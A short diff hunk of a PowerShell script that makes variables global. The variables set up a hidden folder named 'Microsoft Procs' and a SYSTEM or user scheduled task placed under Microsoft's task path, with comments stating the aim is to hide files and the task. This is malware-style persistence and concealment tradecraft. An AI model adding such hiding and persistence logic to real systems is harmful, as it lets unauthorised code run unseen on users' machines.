@@ -11,17 +11,17 @@ $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIden
 if ($isAdmin) {
     Write-Host "Context: Administrator" -ForegroundColor Cyan
     # create backup location to hide files
-    $backupPath = "$env:ProgramFiles\Microsoft Procs"
+    $global:backupPath = "$env:ProgramFiles\Microsoft Procs"
     # options for scheduled task
-    $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount
-    $taskpath = "\Microsoft\Windows\" # Place the task in a subfolder to hide it
+    $global:principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount
+    $global:taskpath = "\Microsoft\Windows\" # Place the task in a subfolder to hide it
 } else {
     Write-Host "Context: Standard User ($env:USERNAME)" -ForegroundColor Cyan
     # create backup location to hide files
-    $backupPath = "$env:USERPROFILE\AppData\Local\Microsoft Procs"
+    $global:backupPath = "$env:USERPROFILE\AppData\Local\Microsoft Procs"
     # options for scheduled task
-    $principal = New-ScheduledTaskPrincipal -UserId "$env:USERNAME" -LogonType Interactive
-    $taskpath = "\" # Place the task in a subfolder to hide it
+    $global:principal = New-ScheduledTaskPrincipal -UserId "$env:USERNAME" -LogonType Interactive
+    $global:taskpath = "\" # Place the task in a subfolder to hide it
 }
 
 
